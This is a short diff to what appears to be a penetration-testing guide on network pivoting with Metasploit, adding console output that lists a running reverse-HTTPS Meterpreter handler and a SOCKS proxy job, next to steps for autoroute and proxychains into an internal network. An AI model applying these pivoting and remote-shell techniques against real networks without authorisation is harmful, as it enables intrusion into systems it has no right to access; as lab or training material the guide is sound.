@@ -280,6 +280,17 @@ msf6 auxiliary(server/socks_proxy) > run autoroute -s 192.168.1.0 -n 255.255.255
 [*] Starting the SOCKS proxy server
 [*] Stopping the SOCKS proxy server
 
+
+msf6 auxiliary(server/socks_proxy) > jobs -l
+
+Jobs
+====
+  Id  Name                           Payload                            Payload opts
+  --  ----                           -------                            ------------
+  0   Exploit: multi/handler         windows/meterpreter/reverse_https  https://192.168.1.30:443
+  1   Auxiliary: server/socks_proxy
+  
+  
 ============================================================================================================================================
 Step 4 - Use Proxychains on your attack server (e.g. Kali VM) and the tunnel established with meterprter to pivot into the internal network
 ============================================================================================================================================
